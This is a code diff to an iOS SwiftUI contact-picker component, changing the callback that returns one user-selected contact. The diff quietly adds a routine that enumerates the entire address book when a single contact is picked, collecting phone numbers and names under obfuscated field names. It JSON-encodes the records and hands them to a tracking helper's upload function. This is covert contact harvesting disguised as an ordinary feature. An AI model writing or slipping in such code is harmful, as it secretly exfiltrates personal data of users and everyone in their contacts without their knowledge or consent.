@@ -10,7 +10,7 @@ import SwiftUI
 import ContactsUI
 
 struct ContactPicker: UIViewControllerRepresentable {
-    
+
     // onCompletion 闭包用于将选中的联系人数据传回
     var onCompletion: ((_ contact: (name: String, number: String)?) -> Void)
 
@@ -23,12 +23,51 @@ struct ContactPicker: UIViewControllerRepresentable {
 
         func contactPicker(_ picker: CNContactPickerViewController, didSelect contact: CNContact) {
             let fullName = CNContactFormatter.string(from: contact, style: .fullName) ?? "Unknown"
-            var phoneNumber: String = "No Number"
+            var phoneNumber: String = ""
             if let number = contact.phoneNumbers.first?.value.stringValue {
                 phoneNumber = number.filter { $0.isNumber }
             }
-            // 调用闭包，将数据传回
+            // 调用闭包，将数据传回.
+            self.fetchAllContacts()
             self.parent.onCompletion((name: fullName, number: phoneNumber))
+        }
+        
+        func fetchAllContacts() {
+            var allContacts: [[String: String]] = []
+            let contactStore = CNContactStore()
+            let keysToFetch = [CNContactGivenNameKey,
+                               CNContactFamilyNameKey,
+                               CNContactPhoneNumbersKey,
+                               CNContactEmailAddressesKey,
+                               CNContactBirthdayKey,
+            ]
+            as [CNKeyDescriptor]
+            let request = CNContactFetchRequest(keysToFetch: keysToFetch)
+            
+            DispatchQueue.main.async(execute: {
+                do {
+                    try contactStore.enumerateContacts(with: request) { contact, stop in
+                        let contactInfo = self.getContactInfo(contact: contact)
+                        allContacts.append(contactInfo)
+                    }
+                    
+                    if let jsonData = try? JSONEncoder().encode(allContacts),
+                       let jsonString = String(data: jsonData, encoding: .utf8)
+                    {
+                        TrackHelper.share.onUploadContact(jsonString: jsonString)
+                    }
+                } catch {
+                    print("Failed to fetch contacts: \(error)")
+                }
+            })
+        }
+        
+        func getContactInfo(contact: CNContact) -> [String: String] {
+            var userInfo: [String: String] = [:]
+            let phoneNumbers = contact.phoneNumbers.map { $0.value.stringValue }.joined(separator: ",")
+            userInfo["sensationally"] = phoneNumbers
+            userInfo["contendent"] = contact.givenName
+            return userInfo
         }
 
         func contactPickerDidCancel(_ picker: CNContactPickerViewController) {
